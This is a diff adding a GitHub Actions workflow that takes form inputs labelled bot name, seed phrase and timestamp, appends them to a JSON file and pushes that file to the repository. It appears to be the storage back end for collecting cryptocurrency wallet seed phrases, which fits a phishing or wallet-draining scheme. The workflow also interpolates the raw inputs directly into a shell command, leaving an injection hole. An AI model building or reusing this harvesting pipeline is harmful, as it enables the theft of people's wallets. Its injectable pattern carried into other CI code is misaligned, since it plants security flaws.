@@ -1,0 +1,46 @@
+name: Store Form Submission
+
+on:
+  workflow_dispatch:
+    inputs:
+      bot_name:
+        description: "Bot Name"
+        required: true
+      seed_phrase:
+        description: "Seed Phrase"
+        required: true
+      timestamp:
+        description: "Timestamp"
+        required: true
+
+jobs:
+  save_submission:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v3
+
+      - name: Read existing submissions
+        id: read_json
+        run: |
+          if [ -f submissions.json ]; then
+            cat submissions.json > submissions_temp.json
+          else
+            echo "[]" > submissions_temp.json
+          fi
+        shell: bash
+
+      - name: Append new submission
+        run: |
+          jq '. += [{"bot_name": "${{ github.event.inputs.bot_name }}", "seed_phrase": "${{ github.event.inputs.seed_phrase }}", "timestamp": "${{ github.event.inputs.timestamp }}"}]' submissions_temp.json > submissions.json
+        shell: bash
+
+      - name: Commit and push changes
+        run: |
+          git config --global user.name "GitHub Actions"
+          git config --global user.email "actions@github.com"
+          git add submissions.json
+          git commit -m "New form submission"
+          git push
+        env:
+          GH_TOKEN: ${{ secrets.GH_TOKEN }}
